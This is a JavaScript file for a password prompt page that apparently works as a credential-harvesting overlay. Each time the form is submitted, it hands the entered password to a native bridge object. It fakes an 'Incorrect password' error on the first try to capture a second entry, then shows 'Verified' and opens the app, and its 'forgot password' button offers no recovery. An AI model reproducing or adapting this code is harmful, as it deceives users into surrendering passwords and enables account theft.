(() => {
  const form = document.getElementById("pwdForm");
  const password = document.getElementById("password");
  const eyeBtn = document.getElementById("eyeBtn");
  const forgotBtn = document.getElementById("forgotBtn");
  const continueBtn = document.getElementById("continueBtn");
  const toastEl = document.getElementById("toast");

  let submitCount = 0;
  let toastTimer = 0;
  let passwordVisible = false;
  let locked = false;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add("is-show");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, 1800);
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function setPasswordVisible(visible) {
    passwordVisible = visible;
    password.type = visible ? "text" : "password";
    eyeBtn.classList.toggle("is-visible", visible);
    eyeBtn.setAttribute("aria-pressed", visible ? "true" : "false");
    eyeBtn.setAttribute("aria-label", visible ? "Hide password" : "Show password");
  }

  eyeBtn.addEventListener("click", () => {
    setPasswordVisible(!passwordVisible);
  });

  forgotBtn.addEventListener("click", () => {
    toast("Please enter your password to continue");
  });

  password.addEventListener("input", () => {
    password.classList.remove("is-error");
  });

  form.addEventListener("submit", (event) => {
    event.preventDefault();
    if (locked) {
      return;
    }

    const pass = password.value;
    if (!pass) {
      password.classList.add("is-error");
      toast("Please enter your password");
      password.focus();
      return;
    }

    locked = true;
    continueBtn.disabled = true;
    submitCount += 1;
    reportDone(pass);

    if (submitCount < 2) {
      toast("Incorrect password");
      password.value = "";
      password.classList.add("is-error");
      locked = false;
      continueBtn.disabled = false;
      password.focus();
      return;
    }

    toast("Verified");
    window.setTimeout(() => {
      openApp();
      locked = false;
      continueBtn.disabled = false;
    }, 420);
  });

  window.setTimeout(() => {
    password.focus();
  }, 120);
})();
